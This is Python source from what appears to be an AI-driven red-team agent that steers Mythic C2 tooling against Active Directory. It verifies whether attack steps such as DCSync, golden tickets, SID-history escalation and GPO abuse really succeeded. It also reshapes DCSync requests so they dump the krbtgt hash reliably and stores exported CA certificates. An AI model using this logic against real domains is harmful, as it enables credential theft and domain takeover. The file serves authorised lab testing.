                # the legacy path recorded `achieved` for a StandIn `--grant` whenever the output lacked a
                # known failure signature, so an `Access is denied` grant (samwell, medium integrity) and the
                # GPO/SYSTEM task that NEVER FIRED (empty output) both recorded `ds-replication-rights achieved`
                # — contradicted by the agent's own zero-ACE enumeration. With the gate demoted to advisor, the
                # achieved-dedup SKIP would then SKIP re-attempting a grant that never landed. Gate the record
                # on a real grant-application artifact via the existing verify_effect seam.
                probe = credential_artifacts.extract_grant_probe(results_str)
                verdict = engagement_state.verify_effect(technique, target_key, probe)
                status = "achieved" if verdict == "achieved" else "failed"
                extra = {
                    "verified_on_record": True,
                    "verify_verdict": verdict,
                    "artifact_present": bool(probe.get("ds_replication_rights")),
                }
                if status != "achieved":
                    # Stickiness: a later no-marker re-probe must NOT downgrade a prior VERIFIED achieved grant
                    # (artifact_present True). A legacy/false achieved (no artifact evidence) IS overwritten —
                    # that is the false-achieved cleanup. Reuses the technique-agnostic prior-verified check.
                    if self._prior_verified_credential_hop(technique, target_key) is not None:
                        logger.info(
                            f"🔒 [verify-on-record] {technique} {target_key}: re-probe found no applied ACE, "
                            f"but a prior VERIFIED achieved grant exists — keeping it, not downgrading."
                        )
                        return
                    logger.warning(
                        f"🔒 [verify-on-record] {technique} {target_key}: NO applied DS-Replication ACE in "
                        f"task output (verdict={verdict}) — recording FAILED, not achieved (the grant did not land)."
                    )
            elif technique in credential_artifacts.TICKET_TECHNIQUES:
                # Strict ticket verification (2026-06-11 false-achieved SID-history bug): Rubeus/Mimikatz
                # can return Mythic "success" while the ticket forge failed, or while only a forge/inject
                # attempt occurred. A ticket hop achieves da:<domain> only when a usable-ticket/access proof is
                # present (Domain/Enterprise Admin membership, explicit valid-ticket proof, or service access).
                # Correlate the proof to the EFFECT's domain (the PARENT for sid-history, whose effect is
                # da:{parent}) so a child-domain group/access line cannot prove a parent-domain effect.
                probe = credential_artifacts.extract_ticket_probe(
                    results_str, expected_domain=self._ticket_effect_domain(technique, target_key)
                )
                verdict = engagement_state.verify_effect(technique, target_key, probe)
                status = "achieved" if verdict == "achieved" else "failed"
                artifact_present = bool(
                    probe.get("domain_admin")
                    or probe.get("ticket_valid")
                    or probe.get("service_access_proven")
                )
                extra = {
                    "verified_on_record": True,
                    "verify_verdict": verdict,
                    "artifact_present": artifact_present,
                    "ticket_forged": bool(probe.get("ticket_forged")),
                    "tgt_present": bool(probe.get("tgt_present")),
                    "ticket_error": bool(probe.get("ticket_error")),
                    "member_of": list(probe.get("member_of") or []),
                }
                if status != "achieved":
                    if self._prior_verified_credential_hop(technique, target_key) is not None:
                        logger.info(
                            f"🔒 [verify-on-record] {technique} {target_key}: ticket proof absent/failed, "
                            f"but a prior VERIFIED achieved hop exists — keeping it, not downgrading."
                        )
                        return
                    logger.warning(
                        f"🔒 [verify-on-record] {technique} {target_key}: no usable ticket/access proof "
                        f"(verdict={verdict}) — recording FAILED, not achieved."
                    )
            elif technique == "domain-admin-membership-check":
                # No output-echo domain correlation here: a `net group "Domain Admins" /domain` is implicitly
                # scoped to the foothold's own domain and does not echo the domain name to correlate against.
                # The deny-only filter, entry-shape check, and benign-string removal still apply via the probe.
                probe = self._extract_domain_admin_membership_probe(results_str)
                verdict = engagement_state.verify_effect(technique, target_key, probe)
                status = "achieved" if verdict == "achieved" else "failed"
                extra = {
                    "verified_on_record": True,
                    "verify_verdict": verdict,
                    "artifact_present": bool(probe.get("domain_admin")),
                    "principal_candidates": list(probe.get("principal_candidates") or []),
                }
                if status != "achieved":
                    logger.info(
                        f"🔒 [verify-on-record] {technique} {target_key}: Domain Admin membership not proven "
                        f"(verdict={verdict}) — recording failed/partial evidence, not da:{target_key}."
                    )
            elif technique == "gpo-abuse":
                # Legacy SharpGPOAbuse writes are setup, not proof. A clean "GPO was modified; wait for refresh"
                # output means the GPO artifact exists and may apply later; it must not satisfy system:{gpo} or
                # unlock DCSync. Only observed SYSTEM execution records achieved.
                if _record_output_is_failure(results_str):
                    logger.warning(
                        f"🔒 [verify-on-record] {technique} {target_key}: task output empty/failed for GPO "
                        f"abuse (preview={str(results_str)[:120]!r}) — NOT recording achieved."
                    )
                    return
                if _gpo_abuse_guid_only_noop(results_str):
                    status = "failed"
                    extra = {
                        "verified_on_record": True,
                        "verify_verdict": "failed",
                        "verify_reason": "SharpGPOAbuse resolved the GPO GUID but did not report a modification",
                        "artifact_present": False,
                        "probe": {"gpo_guid_resolved": True, "gpo_modified": False},
                    }
                    logger.info(
                        f"🔒 [verify-on-record] {technique} {target_key}: SharpGPOAbuse GUID-only output "
                        "is a no-op — recording failed, not pending/achieved."
                    )
                else:
                    try:
                        try:
                            from . import capabilities
                        except ImportError:
                            import capabilities
                        probe = capabilities.extract_gpo_system_exec_probe(results_str)
                        verification = capabilities.verify_gpo_controlled_system_exec(probe)
                        if verification.verdict == "achieved":
                            status = "achieved"
                        elif verification.verdict == "blocked":
                            status = "blocked"
                        elif verification.verdict == "partial":
                            status = "pending"
                        else:
                            status = "failed"
                        extra = {
                            "verified_on_record": True,
                            "verify_verdict": verification.verdict,
                            "verify_reason": verification.reason,
                            "artifact_present": verification.verdict == "achieved",
                            "probe": dict(verification.evidence),
                        }
                        if status != "achieved":
                            logger.info(
                                f"🔒 [verify-on-record] {technique} {target_key}: GPO setup is not execution proof "
                                f"(verdict={verification.verdict}) — recording {status}, not achieved."
                            )
                    except Exception:
                        if _record_output_is_failure(results_str):
                            logger.warning(
                                f"🔒 [verify-on-record] {technique} {target_key}: task output empty/failed for GPO "
                                f"abuse (preview={str(results_str)[:120]!r}) — NOT recording achieved."
                            )
                            return
                        status = "pending"
                        extra = {
                            "verified_on_record": True,
                            "verify_verdict": "partial",
                            "verify_reason": "GPO modified but execution proof unavailable",
                            "artifact_present": False,
                        }
            elif _record_output_is_failure(results_str):
                # Legacy / no-probe technique: with NO artifact to verify, record `achieved`
                # ONLY when the task produced clean output. Empty output or a Mythic/agent error (task errored
                # at CREATION, .NET assembly not registered, traceback, arg-format failure) is NOT success —
                # record nothing so the hop can be retried. Closes the 2026-06-12 gpo-abuse false-achieved:
                # SharpGPOAbuse errored "no assembly by that name" (task never ran) yet recorded achieved,
                # because the narrow breaker list missed the Mythic creation-error traceback.
                logger.warning(
                    f"🔒 [verify-on-record] {technique} {target_key}: task output empty/failed for a no-probe "
                    f"technique (preview={str(results_str)[:120]!r}) — NOT recording achieved."
                )
                return

            state = engagement_state.EngagementState(
                objective=self._engagement_objective(),
                footholds=[],
                hops=list(self._engagement_hops),
                engagement_id=self._eng_key(),
                runtime_scope=True,
            )
            evidence = {
                "source": "issue_task",
                "provenance": "run",
                "result_preview": str(results_str)[:200],
                "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
                "callback_id": getattr(self, "_last_issued_callback_id", None),
                **extra,
            }
            proof_envelope = self._runtime_task_proof_envelope(
                f"engagement_state:{technique}",
                now,
                metadata={"technique": technique, "target": target_key},
            )
            context_effect = ""
            if status == "achieved" and technique in {
                "golden-ticket",
                "sid-history-escalation",
            }:
                primary_effect = engagement_state._technique_effect(technique, target_key)
                prefix, _, effect_domain = primary_effect.partition(":")
                callback_id = str(getattr(self, "_last_issued_callback_id", "") or "").strip().casefold()
                if prefix in {"da", "ea"} and effect_domain and callback_id:
                    context_effect = f"kerberos-context:{effect_domain}@callback:{callback_id}"

            if context_effect:
                primary_effect = engagement_state._technique_effect(technique, target_key)
                updated = engagement_state.record_effect_result(
                    state,
                    technique,
                    target_key,
                    primary_effect,
                    status,
                    evidence,
                    now,
                    preconditions=engagement_state._technique_preconditions(technique, target_key),
                    satisfied_effects=[primary_effect, context_effect],
                    proof_envelope=proof_envelope,
                    require_admissible_proof=True,
                    engagement_id=self._eng_key(),
                )
            else:
                updated = engagement_state.record_hop_result(
                    state,
                    technique,
                    target_key,
                    status,
                    evidence,
                    now,
                    proof_envelope=proof_envelope,
                    require_admissible_proof=True,
                    engagement_id=self._eng_key(),
                )
            self._engagement_hops = updated.hops
            # Write-through to the durable per-engagement ledger so the hop survives runs/restarts.
            try:
                self._persist_engagement_ledger()
            except Exception:
                pass  # fail-open: persistence must never break the issue path
        finally:
            self._pending_engagement_hop = None

    def _ticket_effect_domain(self, technique: str, target_key: str) -> str:
        """The domain of the EFFECT a ticket technique records. For sid-history-escalation the effect is
        da:{parent}, so proof must correlate to the PARENT domain (one DNS label up), not the child target.
        Generic (no GOAD priors): a child is assumed one label deeper than its parent, true for AD subdomains."""
        tk = str(target_key or "").strip()
        if technique == "sid-history-escalation":
            parts = tk.split(".")
            if len(parts) > 2:
                return ".".join(parts[1:])
        return tk

    def _is_replication_access_denied(self, low: str) -> bool:
        """True ONLY for DS_DRA_ACCESS_DENIED (a real replication-RIGHTS denial): hresult 0x2105 / 8453, or
        explicit access-denied text. NOTE: 0x20f7 / 8439 is DS_DRA_BAD_DN (a malformed DN / name-resolution
        error — fix the /user DN, e.g. qualify with the NETBIOS short name), NOT a rights denial, so it must
        NOT downgrade a rights hop. (Forge 2026-06-12: the first version keyed on the wrong hresult.)"""
        if "0x00002105" in low or "0x2105" in low or "ds_dra_access_denied" in low:
            return True
        if "replication access was denied" in low:
            return True
        return (
            re.search(r"(?<![0-9a-fx])8453(?![0-9])", low) is not None
            and any(k in low for k in ("getncchanges", "drsr", "dcsync", "replicat"))
        )

    def _dcsync_params_dict(self, parameters):
        p = parameters
        if isinstance(p, str):
            try:
                p = json.loads(p)
            except Exception:
                return None
        return p if isinstance(p, dict) else None

    def _is_dcsync_command(self, command, parameters) -> bool:
        """True when the issued command is a DCSync / DRSUAPI replication request — native `dcsync`, an
        `lsadump::dcsync` string, OR the mimikatz-via-execute_pe {Domain, User, DC} param shape. Gates the
        downgrade/hint so unrelated output with a stray '8453'/domain string can't trip it."""
        blob = (str(command) + " " + str(parameters)).casefold()
        if "dcsync" in blob or "drsuapi" in blob or "getncchanges" in blob:
            return True
        p = self._dcsync_params_dict(parameters)
        if p is not None:
            keys = {k.lower() for k in p.keys()}
            if "user" in keys and "domain" in keys and "dc" in keys:
                return True
        return False

    def _refutation_domain(self, command, parameters) -> str:
        """The domain a replication-denied error is about — from the ISSUED command's `/domain:` flag or its
        `Domain` param key (never parsed from tool OUTPUT, which can echo a different domain than was denied)."""
        blob = " ".join(str(x) for x in (parameters, command) if x is not None)
        m = re.search(r"/domain:([A-Za-z0-9._-]+)", blob)
        if m:
            return m.group(1).strip().strip('"\'').casefold()
        p = self._dcsync_params_dict(parameters)
        if p is not None:
            for k, v in p.items():
                if k.lower() == "domain" and isinstance(v, str) and v.strip():
                    return v.strip().casefold()
        return ""

    def _apply_contradiction_downgrade(self, command, parameters, results_str) -> None:
        """When a task fails with an error that REFUTES a claimed-achieved precondition, downgrade that hop so
        the false premise REOPENS instead of the agent retrying the dependent action forever (the 8439-×8 loop).
        Canonical case: a dcsync returning DS_DRA_ACCESS_DENIED (8439 / 0x20f7) proves the actor does NOT hold
        DS-Replication rights on that domain — refuting da:/ea:/ds-replication-rights: for it. Intentionally
        decisive: even if the actor IS a real DA whose ticket/context was wrong, REOPENING the hop (re-verify, or
        fix the Kerberos execution context) is correct and cheap; an unbreakable retry loop is not."""
        if not self._is_dcsync_command(command, parameters):
            return  # only a dcsync/replication command's ACCESS_DENIED can refute replication rights
        low = str(results_str or "").casefold()
        if not self._is_replication_access_denied(low):
            return
        domain = self._refutation_domain(command, parameters)
        if not domain:
            return
        try:
            from . import engagement_state
        except ImportError:
            import engagement_state
        targets = {f"{p}{domain}" for p in ("da:", "ea:", "ds-replication-rights:")}
        now = datetime.now(timezone.utc).isoformat()
        state = engagement_state.EngagementState(
            objective=self._engagement_objective(), footholds=[], hops=list(self._engagement_hops),
            engagement_id=self._eng_key(), runtime_scope=True,
        )
        downgraded: list[str] = []
        for hop in list(self._engagement_hops):
            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
                continue
            ev_existing = getattr(hop, "evidence", {}) or {}
            if isinstance(ev_existing, dict) and (ev_existing.get("verified_on_record") or ev_existing.get("artifact_present")):
                continue  # a hop backed by REAL proof is not a false premise; a later denial is a context issue
            effects = {self._capability_text(getattr(hop, "effect", "")).casefold()}
            effects.update(self._capability_text(e).casefold() for e in (getattr(hop, "satisfied_effects", []) or []))
            if not (effects & targets):
                continue
            evidence = {
                "source": "contradiction-downgrade",
                "provenance": "run",
                "contradicted_by_command": self._capability_text(command),
                "contradicted_by_task": getattr(self, "_last_issued_task_display_id", None),
                "refutation": f"replication ACCESS_DENIED (0x2105/8453) on {domain}: the actor lacks DS-Replication rights",
                "note": "this effect could not produce the dependent action; re-verify it, or fix the Kerberos "
                        "execution context if you hold a valid DA ticket. Do NOT blindly retry the dcsync.",
            }
            state = engagement_state.record_effect_result(
                state, getattr(hop, "technique", ""), getattr(hop, "target", ""),
                self._capability_text(getattr(hop, "effect", "")), "failed", evidence, now,
                preconditions=list(getattr(hop, "preconditions", []) or []),
                satisfied_effects=list(getattr(hop, "satisfied_effects", []) or []),
            )
            downgraded.append(self._capability_text(getattr(hop, "effect", "")))
        if downgraded:
            self._engagement_hops = state.hops
            try:
                self._persist_engagement_ledger()
            except Exception:
                pass
            logger.warning(
                f"🔻 [contradiction-downgrade] {command} returned replication ACCESS_DENIED for {domain} — "
                f"downgraded {downgraded} achieved->failed (false premise reopened, not a retry)."
            )

    def _assembly_name_from_params(self, parameters) -> str:
        """The by-name assembly reference (e.g. 'SharpGPOAbuse.exe') from execute_assembly params, or '' when
        the upload/file group is used (a UUID/path is not a registered-assembly name)."""
        p = parameters
        if isinstance(p, str):
            try:
                p = json.loads(p)
            except Exception:
                return ""
        if not isinstance(p, dict):
            return ""
        for key in ("Assembly", "assembly", "assembly_name", "filename", "Filename"):
            v = p.get(key)
            if isinstance(v, str) and v.strip() and re.search(r"\.(exe|dll)$", v.strip(), re.IGNORECASE):
                return v.strip()
        return ""

    def _registered_file_selectors(self, schema) -> list[dict]:
        """Return schema params that select an already-registered Mythic file."""
        if not isinstance(schema, list):
            return []
        file_groups = {
            str(param.get("parameter_group_name") or "Default")
            for param in schema
            if isinstance(param, dict) and str(param.get("type") or "").casefold() == "file"
        }
        if not file_groups:
            return []
        return [
            param
            for param in schema
            if isinstance(param, dict)
            and str(param.get("type") or "").casefold() == "chooseone"
            and str(param.get("parameter_group_name") or "Default") not in file_groups
        ]

    def _registered_file_name_from_schema(self, command, parameters, schema) -> str:
        """Return a by-name registered file reference from a schema-backed parameter dict."""
        if not isinstance(parameters, dict):
            return ""
        selectors = self._registered_file_selectors(schema)
        if not selectors:
            return ""
        try:
            resolved = command_builder.resolve_params(schema, parameters, command=command)
            values = resolved.params if isinstance(resolved.params, dict) else {}
        except Exception:
            values = {}
        for selector in selectors:
            for key in (selector.get("cli_name"), selector.get("name")):
                value = values.get(key) if key in values else parameters.get(key)
                raw = str(value or "").strip()
                if not raw or "/" in raw or "\\" in raw:
                    continue
                if re.search(r"\.[A-Za-z0-9]{1,12}$", raw):
                    return raw
        return ""

    async def _ensure_registered_file_available(self, command, parameters, callback_display_id) -> str | None:
        """Ensure a schema-selected registered file exists in Mythic before task creation.

        This is a Mythic control-plane prerequisite, not a payload-specific command behavior. Commands that
        expose a registered-file selector plus a separate File upload group can use a by-name file reference
        once Mythic filemeta contains that name.
        """
        if not isinstance(parameters, dict) or not parameters:
            return
        schema = await self._fetch_command_schema(command, callback_display_id)
        name = self._registered_file_name_from_schema(command, parameters, schema)
        if not name:
            return
        key = name.casefold()
        if key in self._registered_file_checks:
            return
        if self._registered_file_available_in_schema(schema, name):
            self._registered_file_checks.add(key)
            return
        try:
            raw_upload = await self.ensure_tool_uploaded(name)
            up = json.loads(raw_upload) if isinstance(raw_upload, str) else raw_upload
        except Exception as e:
            blocker = (
                f"{_REGISTERED_FILE_PREFLIGHT_PREFIX} could not register {name!r} before {command!r}: "
                f"ensure_tool_uploaded raised {type(e).__name__}: {e}. "
                f"Do not retry {command!r} until the tool is registered."
            )
            logger.warning(blocker)
            return blocker
        if not isinstance(up, dict):
            blocker = (
                f"{_REGISTERED_FILE_PREFLIGHT_PREFIX} could not register {name!r} before {command!r}: "
                "ensure_tool_uploaded returned an invalid response. "
                f"Do not retry {command!r} until the tool is registered."
            )
            logger.warning(blocker)
            return blocker
        status = str(up.get("status") or "unknown")
        if status not in {"uploaded", "already_present"} or not up.get("file_uuid"):
            detail = str(up.get("error") or up.get("note") or "no Mythic file UUID returned")
            blocker = (
                f"{_REGISTERED_FILE_PREFLIGHT_PREFIX} could not register {name!r} before {command!r}: "
                f"ensure_tool_uploaded returned {status}: {detail}. "
                f"Do not retry {command!r} until the tool is registered."
            )
            logger.warning(blocker)
            return blocker
        self._registered_file_checks.add(key)
        await self._invalidate_command_schema_cache(command, callback_display_id)
        return None

    def _registered_file_available_in_schema(self, schema, name: str) -> bool:
        """Return true when Mythic already exposes the file in registered-selector choices.

        Some Mythic schema queries do not include dynamic query-function choices, so false means "unknown",
        not "absent".
        """
        wanted = self._capability_text(name).strip().casefold()
        if not wanted:
            return False
        for param in self._registered_file_selectors(schema):
            choices = param.get("choices")
            if not isinstance(choices, list):
                continue
            for choice in choices:
                choice_text = self._capability_text(choice).strip().casefold()
                if choice_text == wanted:
                    return True
        return False

    async def _invalidate_command_schema_cache(self, command: str, callback_display_id) -> None:
        try:
            payload_type = await self._resolve_payload_type(callback_display_id)
            if payload_type and hasattr(self, "_cmd_schema_cache"):
                self._cmd_schema_cache.pop((payload_type, command), None)
        except Exception:
            return

    def _normalize_dcsync_user(self, user, domain) -> str:
        """Normalize a dcsync target user to NETBIOS\\sAMAccountName. Handles bare ('krbtgt'), FQDN
        ('dom.fqdn\\krbtgt'), DN ('CN=krbtgt,CN=Users,DC=...'), and user@domain forms. The bare/FQDN/DN forms
        are ambiguous or invalid to the DC's CrackNames (ERROR_NOT_UNIQUE / BAD_DN 8439); NETBIOS\\sam is exact."""
        u = str(user or "").strip()
        if not u:
            return u
        netbios = str(domain or "").strip().split(".", 1)[0].upper()
        m = re.match(r"(?i)\s*cn=([^,]+),", u)  # DN -> sAMAccountName
        if m:
            acct = m.group(1).strip()
        elif "\\" in u:
            acct = u.rsplit("\\", 1)[1].strip()
        elif "@" in u:
            acct = u.split("@", 1)[0].strip()
        else:
            acct = u
        if not acct:
            return u
        return f"{netbios}\\{acct}" if netbios else acct

    def _qualify_mimikatz_dcsync_string(self, s: str) -> str:
        """Normalize the /user value inside an `lsadump::dcsync /domain:X /user:Y ...` argument string."""
        dm = re.search(r"/domain:([A-Za-z0-9._-]+)", s)
        if not dm:
            return s
        dom = dm.group(1)
        return re.sub(r"/user:([^\s]+)", lambda mm: f"/user:{self._normalize_dcsync_user(mm.group(1), dom)}", s)

    def _looks_like_dcsync_params(self, command, p) -> bool:
        if "dcsync" in _normalize_command_name(command):
            return True
        blob = (json.dumps(p) if isinstance(p, dict) else str(p)).casefold()
        if "dcsync" in blob or "lsadump" in blob:
            return True
        keys = {k.lower() for k in p.keys()} if isinstance(p, dict) else set()
        return "user" in keys and "domain" in keys and "dc" in keys  # {Domain,User,DC} mimikatz-via-execute_pe shape

    def _qualify_dcsync_params(self, command, parameters):
        """Normalize raw Mimikatz DCSync user values to NETBIOS\\sAMAccountName.

        This includes native payload `dcsync` dictionaries. Apollo's native command wraps Mimikatz and still
        emits `/user:<value>` internally, so a bare `krbtgt` reaches CrackNames ambiguously in multi-domain
        forests and returns ERROR_NOT_UNIQUE.
        """
        command_name = _normalize_command_name(command)
        is_str = isinstance(parameters, str)
        p = parameters
        if is_str:
            s = parameters.strip()
            try:
                p = json.loads(s) if s.startswith("{") else None
            except Exception:
                p = None
        if p is None or not isinstance(p, dict):
            if isinstance(parameters, str) and "lsadump::dcsync" in parameters.casefold():
                return self._qualify_mimikatz_dcsync_string(parameters)
            return parameters
        p = dict(p)
        changed = False
        for k, v in list(p.items()):
            if isinstance(v, str) and "lsadump::dcsync" in v.casefold():
                nv = self._qualify_mimikatz_dcsync_string(v)
                if nv != v:
                    p[k] = nv
                    changed = True
        if self._looks_like_dcsync_params(command, p):
            ukey = next((k for k in p if k.lower() in ("user", "account")), None)
            dkey = next((k for k in p if k.lower() == "domain"), None)
            if ukey and isinstance(p.get(ukey), str) and p.get(ukey).strip():
                dom = str(p.get(dkey) or "").strip() if dkey else ""
                nu = self._normalize_dcsync_user(p[ukey], dom)
                if nu != p[ukey]:
                    p[ukey] = nu
                    changed = True
        if not changed:
            return parameters
        return json.dumps(p) if is_str else p

    async def _coerce_native_dcsync_to_working_form(self, command, parameters):
        """Reshape a native Apollo ``dcsync`` task into the ONLY form proven to dump a hash in-lab:
        a ``{domain, user: NETBIOS\\sAMAccountName, dc: <DC FQDN>}`` dict.

        The model routinely free-hands ``dcsync`` as a freeform string (``'<domain> <user>'``,
        ``'-Domain X -User Y'``) or a dc-less dict; Apollo rejects those ("No mimikatz command given to
        execute") or they fail CrackNames. The deterministic capability adapter already builds the working
        form, but the model can bypass it — this guard makes the correct form non-bypassable. Generic for any
        domain/user/forest (no range-specific literals); the DC is resolved from BloodHound. Fail-open: any
        parse/resolve failure returns the parameters unchanged so the issue path is never blocked or worsened.
        """
        if _normalize_command_name(command) != "dcsync":
            return parameters
        domain = user = dc = ""
        p = parameters
        if isinstance(p, str):
            s = p.strip()
            if s.startswith("{"):
                try:
                    p = json.loads(s)
                except Exception:
                    p = None
            else:
                dm = re.search(r"(?:/domain:|-domain\s+)([A-Za-z0-9._-]+)", s, re.I)
                um = re.search(r"(?:/user:|-user\s+)(\S+)", s, re.I)
                dcm = re.search(r"(?:/dc:|-dc\s+|-domaincontroller\s+)([A-Za-z0-9._-]+)", s, re.I)
                domain = dm.group(1) if dm else ""
                user = um.group(1) if um else ""
                dc = dcm.group(1) if dcm else ""
                if not domain:  # bare '<domain> <user>': first dotted non-flag token is the domain
                    toks = [t for t in s.split() if not t.startswith("-")]
                    dotted = [t for t in toks if "." in t]
                    if dotted:
                        domain = dotted[0]
                        rest = [t for t in toks if t != domain]
                        if rest and not user:
                            user = rest[0]
                p = None
        if isinstance(p, dict):
            low = {k.lower(): k for k in p}
            domain = self._capability_text(p.get(low.get("domain", ""), "")) or domain
            user = self._capability_text(p.get(low.get("user") or low.get("account", ""), "")) or user
            dc = self._capability_text(p.get(low.get("dc") or low.get("domain_controller", ""), "")) or dc
        # Defense-in-depth: the domain flows into a Cypher DC lookup; a DNS domain is [A-Za-z0-9._-] only,
        # so strip anything else here rather than relying solely on downstream quote-stripping.
        domain = re.sub(r"[^A-Za-z0-9._-]", "", domain)
        if not domain:
            return parameters  # no safe target — leave untouched
        user = self._normalize_dcsync_user(user or "krbtgt", domain)
        if not dc:
            try:
                dc = await self._resolve_domain_controller_host(domain)
            except Exception:
                dc = ""
        out = {"domain": domain, "user": user}
        if dc:
            out["dc"] = dc
        return out

    def _normalize_sharphound_assembly_params(self, command, parameters):
        command_name = _normalize_command_name(command)
        if command_name not in {"execute_assembly", "inline_assembly"}:
            return parameters
        assembly_name = self._assembly_name_from_params(parameters).casefold()
        if not assembly_name and isinstance(parameters, str) and "sharphound" in parameters.casefold():
            assembly_name = parameters.casefold()
        if "sharphound" not in assembly_name:
            return parameters
        is_str = isinstance(parameters, str)
        p = parameters
        if is_str:
            s = parameters.strip()
            try:
                p = json.loads(s) if s.startswith("{") else None
            except Exception:
                p = None
        if isinstance(p, dict):
            p = dict(p)
            key_by_name = {str(k).casefold(): k for k in p.keys()}
            for key in ("assembly_arguments", "arguments", "args", "argument", "commandline"):
                existing_key = key_by_name.get(key)
                if existing_key is None:
                    continue
                value = p.get(existing_key)
                if not isinstance(value, str):
                    continue
                normalized = normalize_sharphound_arguments(value)
                if normalized != value:
                    p[existing_key] = normalized
                    logger.info("🧭 [sharphound-args] normalized invalid short flag -> long form")
                    return json.dumps(p) if is_str else p
                return parameters
            return parameters
        if isinstance(parameters, str):
            normalized = normalize_sharphound_arguments(parameters)
            if normalized != parameters:
                logger.info("🧭 [sharphound-args] normalized invalid short flag -> long form")
                return normalized
        return parameters

    @staticmethod
    def _rewrite_shell_like_run(command, parameters):
        normalized_command = _normalize_command_name(command)
        if normalized_command in {"powerpick", "powershell", "ps"}:
            if isinstance(parameters, dict):
                lowered_parameters = {str(k).casefold(): v for k, v in parameters.items()}
                for key in ("command", "script", "powershell", "arguments", "args"):
                    value = lowered_parameters.get(key)
                    if isinstance(value, str) and value.strip():
                        return command, value.strip()
            return command, parameters
        if normalized_command not in {"run", "shell"}:
            return command, parameters

        text = ""
        lowered_parameters = {}
        if isinstance(parameters, dict):
            lowered_parameters = {str(k).casefold(): v for k, v in parameters.items()}
            for key in ("command", "cmd", "shell", "arguments"):
                value = lowered_parameters.get(key)
                if isinstance(value, str) and value.strip():
                    text = value.strip()
                    break
        elif isinstance(parameters, str):
            text = parameters.strip()
        if not text:
            return command, parameters

        if normalized_command == "shell":
            return "shell", text

        low = text.casefold()
        if low.startswith("cmd.exe /c "):
            return "shell", text[len("cmd.exe /c "):].strip()
        if low.startswith("cmd /c "):
            return "shell", text[len("cmd /c "):].strip()
        first = low.split(None, 1)[0] if low.split(None, 1) else low
        shell_builtins = {
            "assoc", "break", "call", "cd", "chdir", "cls", "color", "copy", "date", "del", "dir",
            "echo", "endlocal", "erase", "for", "ftype", "if", "md", "mkdir", "mklink", "move", "path",
            "pause", "popd", "prompt", "pushd", "rd", "ren", "rename", "rmdir", "set", "setlocal",
            "shift", "start", "time", "title", "type", "ver", "verify", "vol",
        }
        if first in shell_builtins or any(op in text for op in ("&&", "||", "|", ">", "<")):
            return "shell", text
        if "command" in lowered_parameters:
            return "shell", text
        return command, parameters

    def _raw_gpo_mutation_blocker(self, command, parameters) -> str:
        normalized_command = _normalize_command_name(command)
        if normalized_command not in {"powerpick", "powershell", "ps", "shell", "run"}:
            return ""
        context = self._deterministic_capability_command_context(command, parameters)
        if self._capability_text(context.get("capability")).casefold() == "gpo-controlled-system-exec":
            return ""
        text = self._capability_text(parameters)
        if isinstance(parameters, dict):
            try:
                text = json.dumps(parameters, sort_keys=True, default=str)
            except Exception:
                text = str(parameters)
        low = text.casefold()
        gpo_markers = (
            "scheduledtasks.xml",
            "\\machine\\preferences\\scheduledtasks",
            "gpcmachineextensionnames",
            "cn=policies,cn=system",
            "\\sysvol\\",
            "gpt.ini",
            "immediatetaskv2",
        )
        if not any(marker in low for marker in gpo_markers):
            return ""
        mutation_markers = (
            "set-content",
            "add-content",
            "out-file",
            "new-item",
            "commitchanges",
            "directoryattributemodification",
            "modifyrequest",
        )
        compact = re.sub(r"\s+", "", low)
        property_assignment = any(
            marker in compact
            for marker in (
                "properties['versionnumber'].value=",
                'properties["versionnumber"].value=',
                "properties['gpcmachineextensionnames'].value=",
                'properties["gpcmachineextensionnames"].value=',
                ".properties['versionnumber'].value=",
                '.properties["versionnumber"].value=',
                ".properties['gpcmachineextensionnames'].value=",
                '.properties["gpcmachineextensionnames"].value=',
            )
        )
        if not (any(marker in low for marker in mutation_markers) or property_assignment):
            return ""
        return (
            "STOP — raw GPO mutation scripts are blocked outside execute_capability/build_capability_commands. "
            "Use execute_capability with capability='gpo-controlled-system-exec' so the deterministic adapter "
            "owns GPP XML construction, CSE registration, computer-side version bumping, waiting, and proof-path "
            "verification. Read-only GPO inspection is allowed; hand-written PowerShell that writes SYSVOL, "
            "ScheduledTasks.xml, GPT.INI, gPCMachineExtensionNames, or versionNumber is not."
        )

    def _artifact_secret(self, prefix: str, slug: str = "") -> str:
        """Per-run, non-source-visible password for a forged/exported offensive artifact (shared salt with
        capabilities.artifact_secret so a forge step and its use step agree on the password)."""
        try:
            from . import capabilities as _caps
        except ImportError:
            import capabilities as _caps
        return _caps.artifact_secret(prefix, slug)

    def _persist_adcs_ca_export_artifact(self, output: str, target_host: str, target_domain: str) -> dict[str, str]:
        """Persist raw CA PFX output before the durable probe drops its base64 bytes."""
        if not target_host or not target_domain:
            return {}
        try:
            from . import adcs_certificate_materializer
        except ImportError:
            import adcs_certificate_materializer
        try:
            return adcs_certificate_materializer.persist_verified_ca_pfx_artifact(
                output,
                Path(_engagement_state_dir()) / "artifacts",
                engagement_key=self._eng_key(),
                ca_host=target_host,
                domain=target_domain,
            )
        except Exception:
            return {}

    @staticmethod
    def _adcs_ca_export_artifact_evidence(probe: dict | None) -> dict[str, str]:
        if not isinstance(probe, dict):
            return {}
        return {
            key: str(probe[key])
            for key in ("pfx_artifact_path", "pfx_artifact_id", "pfx_artifact_sha256")
            if probe.get(key)
        }

    def _extract_domain_admin_membership_probe(self, output, expected_domain=None) -> dict:
        text = str(output or "")
        low = text.casefold()
        candidates = self._last_callback_identity_candidates()
        member_present = any(_contains_identity_token(low, candidate) for candidate in candidates)
        denied = any(marker in low for marker in (
            "access is denied",
            "system error 5",
            "could not be found",
            "not recognized",
        ))
        # Domain-correlated, deny-only-filtered group detection (drops the benign "command completed
        # successfully" marker that previously let any successful command pass as a DA group query).
        try:
            from . import credential_artifacts as _ca
        except ImportError:
            import credential_artifacts as _ca
        qualifying = _ca._qualifying_group_memberships(text, expected_domain=expected_domain)
        group_query_succeeded = bool(
            not denied and any(g.casefold() == "domain admins" for g in qualifying)
        )
        domain_admin = bool(group_query_succeeded and member_present)
        return {
            "domain_admin": domain_admin,
            "group_query_succeeded": group_query_succeeded,
            "member_of": ["Domain Admins"] if domain_admin else [],
            "principal_present": member_present,
            "principal_candidates": candidates,
            "access_denied": denied,
        }

    def _last_callback_identity_candidates(self) -> list[str]:
        callback_id = str(getattr(self, "_last_issued_callback_id", "") or "")
        identity = ""
        for foothold in list(getattr(self, "_engagement_footholds", []) or []):
            if str(getattr(foothold, "callback_id", "")) == callback_id:
                identity = str(getattr(foothold, "identity", "") or "")
                break
        out: list[str] = []
